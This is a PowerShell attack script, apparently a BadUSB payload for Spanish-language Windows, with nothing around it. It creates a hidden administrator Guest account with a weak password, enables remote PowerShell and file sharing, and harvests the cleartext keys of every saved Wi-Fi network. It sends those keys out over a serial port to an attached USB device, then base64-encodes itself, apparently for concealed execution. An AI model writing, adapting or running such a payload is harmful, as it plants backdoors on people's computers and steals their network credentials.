$MyScript = @'
net user Guest 123456 /add
net localgroup Administradores Guest /add
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v Guest /t REG_DWORD /d 0 /f
Enable-PSRemoting -SkipNetworkProfileCheck -Force
netsh advfirewall firewall set rule group="Compartir archivos e impresoras" new enable=Yes
$output = netsh wlan show profiles
$profileRows = $output | Select-String -Pattern 'Perfil de todos los usuarios'
$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace "root\CIMV2" -Filter "PNPDeviceID like'USB\\VID_1b4f&PID_9208%'").Caption
$com=[regex]::match($s,'\(([^\)]+)\)').Groups[1].Value
$port=new-Object System.IO.Ports.SerialPort $com,38400,None,8,one
$port.open()
$cmd=""
for($i = 0; $i -lt $profileRows.Count; $i++){
	$profileName = ($profileRows[$i] -split ":")[-1].Trim()
    $profileOutput = netsh wlan show profiles name="$profileName" key=clear
	$SSIDSearchResult = $profileOutput| Select-String -Pattern 'Nombre de SSID'
    $profileSSID = ($SSIDSearchResult -split ":")[-1].Trim() -replace '"'
    $passwordSearchResult = $profileOutput| Select-String -Pattern 'Contenido de la clave'
    if($passwordSearchResult){$profilePw = ($passwordSearchResult -split ":")[-1].Trim()} else {$profilePw = ''}
	$cmd = $cmd + "-" + $profileSSID + ":" + $profilePw
}
$port.WriteLine("SerialEXFIL:$cmd")
$port.Close()
'@

$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyScript))

